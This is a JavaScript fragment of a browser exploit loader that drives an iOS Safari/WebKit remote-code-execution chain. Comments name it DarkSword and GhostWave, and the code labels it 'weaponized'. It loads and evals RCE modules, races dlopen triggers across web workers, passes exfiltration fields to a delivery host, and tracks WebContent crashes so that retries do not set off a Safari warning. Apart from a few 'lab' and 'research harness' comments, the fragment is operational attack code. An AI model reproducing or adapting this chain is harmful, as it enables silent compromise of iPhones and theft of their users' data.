print('chain_target: ' + chain_target.chain + ' ok=' + chain_target.delivery_ok + ' ' + chain_target.reason);
async function runWorkerAttempt(workerCode, workerFile) {
    var isHarness = workerFile && workerFile.indexOf('26.3') >= 0;
    return new Promise((resolve) => {
        let settled = false;
        function finish(ok) {
            if (settled) return;
            settled = true;
            clearTimeout(watchdog);
            resolve(!!ok);
        }
        var _workerSrc = workerCode;
        const workerBlobUrl = URL.createObjectURL(new Blob([_workerSrc], { type: 'text/javascript' }));
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        const worker = new Worker(workerBlobUrl);
        const dlopen_workers = [];
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = '0';
        iframe.style.width = '0';
        ensureBody().appendChild(iframe);
        const watchdog = setTimeout(() => {
            print('worker watchdog timeout: ' + workerFile, true);
            try { worker.terminate(); } catch (e) {}
            finish(false);
        }, isHarness ? 20000 : 1200000);

        if (isHarness) {
            worker.onerror = function (err) {
                print('harness onerror: ' + (err && err.message ? err.message : err), true);
                try { worker.terminate(); } catch (e) {}
                finish(true); // harness errors still count as completed research path
            };
            worker.onmessage = function (e) {
                var data = e.data || {};
                if (data.type === 'log') {
                    print(data.text || '', !!data.error);
                    return;
                }
                if (data.type === 'stage') {
                    print('harness stage ' + (data.stage || '?') + ' ' + (data.status || '') + ' ' + (data.message || data.reason || ''));
                    return;
                }
                if (data.type === 'ready') {
                    worker.postMessage({
                        name: 'begin',
                        type: 'begin',
                        ios: ios_version ? ios_version.join('.') : '26.3',
                        deviceUUID: resolveLabDeviceUUID(),
                        model: device_model || '',
                        build: ''
                    });
                    return;
                }
                if (data.type === 'done') {
                    print('harness done: ' + (data.message || 'ok'));
                    try { worker.terminate(); } catch (e) {}
                    finish(true); // research path completed honestly
                }
            };
            // Kick if ready already fired before handler attached
            setTimeout(function () {
                try {
                    worker.postMessage({
                        name: 'begin',
                        type: 'begin',
                        ios: ios_version ? ios_version.join('.') : '26.3',
                        deviceUUID: resolveLabDeviceUUID()
                    });
                } catch (eK) {}
            }, 50);
            return;
        }

        async function prepare_dlopen_workers() {
            for (let i = 1; i <= 2; ++i) {
                const dw = new Worker(dlopen_worker_url);
                dlopen_workers.push(dw);
                await new Promise(r => {
                    dw.postMessage({ type: 'init', data: 0x11111111 * i });
                    dw.onmessage = r;
                });
            }
        }
        async function message_handler(e) {
            const data = e.data;
            switch (data.type) {
                case 'log':
                    print(data.text || '', !!data.error);
                    break;
                case 'redirect':
                    await waitPeExfilGrace();
                    redirect();
                    finish(true);
                    break;
                case 'stage1_failed':
                    print('stage1_failed on ' + workerFile + ' (' + (data.reason || '?') + ')', true);
                    try { worker.terminate(); } catch (e) {}
                    finish(false);
                    break;
                case 'prepare_dlopen_workers':
                    await prepare_dlopen_workers();
                    worker.postMessage({ type: 'dlopen_workers_prepared' });
                    break;
                case 'trigger_dlopen1':
                    // Start scanner first, then close()-trigger dlopen under +0x10 prehold.
                    worker.postMessage({ type: 'check_dlopen1' });
                    await new Promise(r => setTimeout(r, 30));
                    dlopen_workers[0].postMessage({ type: 'dlopen' });
                    break;
                case 'retrigger_dlopen1':
                    // Fresh bitmap close while scanner waits â€” another UlvE under prehold.
                    try { dlopen_workers[0].postMessage({ type: 'dlopen' }); } catch (_) {}
                    break;
                case 'trigger_dlopen2':
                    // Same order as dlopen1: start stack scanner FIRST, then trigger
                    // close()/dlopen. Waiting 250ms then scanning races on fast 18.6.x
                    // devices â€” dlopen finishes before check_dlopen2 and the retaddr
                    // is gone â†’ infinite efficient_search hang.
                    worker.postMessage({ type: 'check_dlopen2' });
                    await new Promise(r => setTimeout(r, 30));
                    dlopen_workers[1].postMessage({ type: 'dlopen' });
                    break;
                case 'sign_pointers':
                    iframe.contentDocument.write('1');
                    worker.postMessage({ type: 'setup_fcall' });
                    break;
                case 'slow_fcall':
                    iframe.contentDocument.write('1');
                    worker.postMessage({ type: 'slow_fcall_done' });
                    break;
                default:
                    break;
            }
        }
        worker.onerror = function (err) {
            print('worker onerror: ' + workerFile + ' ' + (err && err.message ? err.message : err), true);
            try { worker.terminate(); } catch (e) {}
            finish(false);
        };
        worker.onmessage = message_handler;
        try {
            const mod = moduleForWorker(workerFile);
            const useWorkerRce = isIos186Plus(ios_version);
            let rceCode = '';
            // Original DarkSword / nuih on 18.6.x: page only loads an 85B stub (or nothing).
            // RCE is entirely inside rce_worker_18.6 via stage1_rce. Eval'ing the full
            // 173KB rce_module_18.6.js on the page races the worker heap â†’ WebContent
            // crash right after "success with N unit tries" (never reaches stage1_prim).
            if (useWorkerRce) {
                print('module skip: stage1_rce self-contained (match upstream 18.6)');
            } else if (mod) {
                rceCode = getJS(mod + '?' + Date.now()) || '';
                if (!rceCode || rceCode.length < 500) {
                    print('module stub/missing: ' + mod + ' (len=' + ((rceCode && rceCode.length) || 0) + ')');
                    const fb = getJS('rce_module.js?' + Date.now());
                    if (fb && fb.length >= 500) {
                        rceCode = fb;
                        print('module fallback -> rce_module.js');
                    } else {
                        print('module load failed: ' + mod, true);
                        finish(false);
                        return;
                    }
                }
            }
            if (rceCode) {
                try { eval(rceCode); } catch (e) {
                    print('module eval error: ' + mod + ' ' + e, true);
                    finish(false);
                    return;
                }
            }
            print('module ready: ' + (useWorkerRce ? '(worker-rce)' : (mod || 'none'))
                + ' len=' + ((rceCode && rceCode.length) || 0)
                + ' check_attempt=' + (typeof check_attempt));
            try { globalThis.ios_version_key = iosVersionKey(ios_version); } catch (e) {}
            const desiredHost = resolveDeliveryHost();
            if (!desiredHost) { print('fatal: no delivery host', true); finish(false); return; }
            print('rce_path: ' + (useWorkerRce ? 'stage1_rce(worker)' : 'check_attempt(page)')
                + ' ios=' + (ios_version ? ios_version.join('.') : '?'));
            if (useWorkerRce) {
                worker.postMessage(Object.assign({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG,
                    _enc_pass: labEncPassword()
                }, exfilFields()));
            } else {
                if (typeof check_attempt !== 'function') {
                    print('fatal: check_attempt missing after module eval', true);
                    finish(false);
                    return;
                }
                var attempt = new check_attempt();
                function onAttemptDone(result) {
                    if (!result) {
                        print('check_attempt returned false', true);
                        finish(false);
                        return;
                    }
                    if (!validateStage1Handoff()) {
                        finish(false);
                        return;
                    }
                    if (!postStage1ToWorker(worker, begin, origin, desiredHost)) {
                        finish(false);
                    }
                }
                print('check_attempt start');
                var rceWatch = setTimeout(function () {
                    print('check_attempt still running after 15s (no RCE success/fail yet)', true);
                }, 15000);
                attempt.start().then((result) => {
                    clearTimeout(rceWatch);
                    if (!result) {
                        print('check_attempt first try failed â€” retrying', true);
                        attempt.start().then(onAttemptDone).catch(function (e) {
                            print('check_attempt retry failed: ' + e, true);
                            finish(false);
                        });
                    } else {
                        onAttemptDone(true);
                    }
                }).catch(function (e) {
                    clearTimeout(rceWatch);
                    print('check_attempt failed: ' + e, true);
                    finish(false);
                });
            }
        } catch (e) {
            print('runWorkerAttempt setup error: ' + e, true);
            finish(false);
        }
    });
}

async function launchExploitChain() {
    var grade = chain_target.usable_grade || '';
    print('usable_grade=' + (grade || '?') + ' weaponized=' + !!chain_target.weaponized);

    // DEAD / fully patched: still run research harness (26.3), do not claim exploit success
    if (chain_target.chain === 'ghostwave' && (grade === 'DEAD' || chain_target.patched)) {
        print('GhostWave DEAD path â€” research harness only: ' + chain_target.reason);
        if (chain_target.warning) print('warning: ' + chain_target.warning, true);
        const host = resolveDeliveryHost();
        if (!host) {
            print('fatal: no delivery host resolved', true);
            return;
        }
        var harnessChain = worker_plan.length ? worker_plan : ['rce_worker_26.3.js'];
        // Prefer 26.3 harness first
        if (harnessChain.indexOf('rce_worker_26.3.js') < 0) {
            harnessChain = ['rce_worker_26.3.js'].concat(harnessChain);
        }
        for (var hi = 0; hi < harnessChain.length; hi++) {
            var hc = harnessChain[hi];
            if (hc.indexOf('26.3') < 0 && grade === 'DEAD' && ios_version && ios_version[0] === 26 && (ios_version[1] || 0) >= 3) {
                continue; // do not burn long RCE workers on fully patched 26.3
            }
            var code = await resolveWorkerCode(hc);
            if (!code || code.length < workerMinBytes(hc)) {
                print('worker ' + hc + ' unavailable (' + (code ? code.length : 0) + ' bytes)');
                continue;
            }
            print('launch harness: ' + hc + ' @ ' + host);
            await runWorkerAttempt(code, hc);
            return;
        }
        print('fatal: 26.3 harness unavailable', true);
        return;
    }

    if (chain_target.patched && chain_target.chain !== 'ghostwave') {
        print('fatal: iOS version ' + chain_target.version_str + ' is patched: ' + chain_target.reason, true);
        if (chain_target.warning) {
            print('warning: ' + chain_target.warning, true);
        }
        return;
    }
    
    if (!chain_target.delivery_ok) {
        print('fatal: delivery blocked ? ' + chain_target.reason, true);
        return;
    }
    const host = resolveDeliveryHost();
    if (!host) {
        print('fatal: no delivery host resolved', true);
        return;
    }
    // JIT + heap warmup before worker spawn (short â€” long warmup delays S1)
    try {
        const warm = new Array(32);
        for (let w = 0; w < 3; w++) {
            for (let i = 0; i < warm.length; i++) warm[i] = { a: w, b: i, c: Math.random() };
            warm.sort((a, b) => a.b - b.b);
        }
        print('jit_warmup ok');
    } catch (e) {}
    const chain = worker_plan.length ? worker_plan : workerFallbackChain(ios_version);
    // If WebContent jetsam/crashed mid-worker, the page reloads before stage1_failed.
    // Detect in-flight worker from prior load and skip it for ~2 minutes.
    // Use localStorage so skip survives iframe recreate (sessionStorage is wiped).
    try {
        var inflight = localStorage.getItem('__ds_inflight_worker') || '';
        var its = parseInt(localStorage.getItem('__ds_inflight_ts') || '0', 10) || 0;
        if (inflight && its && (Date.now() - its) < 45000) {
            var crashCountKey = '__ds_crash_count_' + inflight;
            var crashCnt = (parseInt(localStorage.getItem(crashCountKey) || '0', 10) || 0) + 1;
            localStorage.setItem(crashCountKey, String(crashCnt));
            var inIframe = false;
            try {
                inIframe = !!(window.parent && window.parent !== window);
            } catch (_) {
                inIframe = true;
            }
            // åµŒåœ¨ index iframeï¼šWC å´©ä¸€æ¬¡å°±åœï¼Œç¦æ­¢åŒ worker é‡è¯•ï¼ˆå¦åˆ™ Safari å¼¹ã€Œé‡å¤å‡ºçŽ°é—®é¢˜ã€ï¼‰
            if (inIframe) {
                print(
                    'detected WebContent crash mid ' +
                        inflight +
                        ' x' +
                        crashCnt +
                        ' â€” stop (iframe, no retry)',
                    true
                );
                try {
                    window.parent.postMessage(
                        {
                            type: 'ds-wc-crash',
                            worker: inflight,
                            count: crashCnt,
                            progress: 42,
                        },
                        '*'
                    );
                } catch (_) {}
                try {
                    localStorage.removeItem('__ds_inflight_worker');
                    localStorage.removeItem('__ds_inflight_ts');
                } catch (_) {}
                return;
            }
            // First mid-worker crash (often early aar/w jetsam) â€” retry same worker.
            // Only skip after 2 crashes within the window so we don't jump to missing fallbacks.
            if (crashCnt >= 2) {
                var skipRaw = localStorage.getItem('__ds_skip_workers') || '[]';
                var skipArr = [];
                try { skipArr = JSON.parse(skipRaw) || []; } catch (_) { skipArr = []; }
                if (skipArr.indexOf(inflight) < 0) skipArr.push(inflight);
                localStorage.setItem('__ds_skip_workers', JSON.stringify(skipArr));
                localStorage.setItem('__ds_crash_mid_' + inflight, String(Date.now()));
                print('detected WebContent crash mid ' + inflight + ' x' + crashCnt + ' â€” skip on retry', true);
            } else {
                print('detected WebContent crash mid ' + inflight + ' x' + crashCnt + ' â€” retry same worker', true);
            }
        }
        localStorage.removeItem('__ds_inflight_worker');
        localStorage.removeItem('__ds_inflight_ts');
    } catch (_) {}
    function workerSkipped(file) {
        try {
            var t = parseInt(localStorage.getItem('__ds_crash_mid_' + file) || '0', 10) || 0;
            if (t && (Date.now() - t) < 120000) return true;
            var arr = JSON.parse(localStorage.getItem('__ds_skip_workers') || '[]') || [];
            return arr.indexOf(file) >= 0;
        } catch (_) { return false; }
    }
    print('launch chain: ' + chain.join(' ? ') + ' @ ' + host
        + (chain_target.ghostwave ? ' [GhostWave]' : '')
        + (grade ? ' grade=' + grade : ''));
    // Crash-skip must not discard the only runnable worker (common on 18.6 lab: only 18.6.js exists).
    var runnable = [];
    for (let wi0 = 0; wi0 < chain.length; wi0++) {
        if (!workerSkipped(chain[wi0])) runnable.push(chain[wi0]);
    }
    if (!runnable.length) {
        print('crash-skip would exhaust chain â€” clearing skip, retry primary', true);
        try {
            for (let ci = 0; ci < chain.length; ci++) {
                localStorage.removeItem('__ds_crash_mid_' + chain[ci]);
            }
            localStorage.setItem('__ds_skip_workers', '[]');
        } catch (_) {}
        runnable = chain.slice();
    }
    for (let wi = 0; wi < runnable.length; wi++) {
        const candidate = runnable[wi];
        if (workerSkipped(candidate) && runnable.length > 1) {
            print('skip ' + candidate + ' (prior WebContent crash)', true);
            continue;
        }
        if (workerSkipped(candidate) && runnable.length === 1) {
            print('retry ' + candidate + ' despite prior crash (sole worker)', true);
        }
        const code = await resolveWorkerCode(candidate);
        if (!code || code.length < workerMinBytes(candidate)) {
            print('worker ' + candidate + ' unavailable (' + (code ? code.length : 0) + ' bytes)');
            continue;
        }
        if (wi > 0) print('worker fallback -> ' + candidate);
        try {
            localStorage.setItem('__ds_inflight_worker', candidate);
            localStorage.setItem('__ds_inflight_ts', String(Date.now()));
        } catch (_) {}
        const ok = await runWorkerAttempt(code, candidate);
        try {
            localStorage.removeItem('__ds_inflight_worker');
            localStorage.removeItem('__ds_inflight_ts');
            if (ok) {
                localStorage.removeItem('__ds_crash_mid_' + candidate);
                localStorage.removeItem('__ds_crash_count_' + candidate);
                var left = (JSON.parse(localStorage.getItem('__ds_skip_workers') || '[]') || []).filter(function (x) { return x !== candidate; });
                localStorage.setItem('__ds_skip_workers', JSON.stringify(left));
            }
        } catch (_) {}
        if (ok) return;
        if (wi + 1 < runnable.length) {
            print('retrying with ' + runnable[wi + 1], true);
        }
    }
    print('fatal: all workers exhausted for iOS ' + (ios_version ? ios_version.join('.') : '?'), true);
}
launchExploitChain();
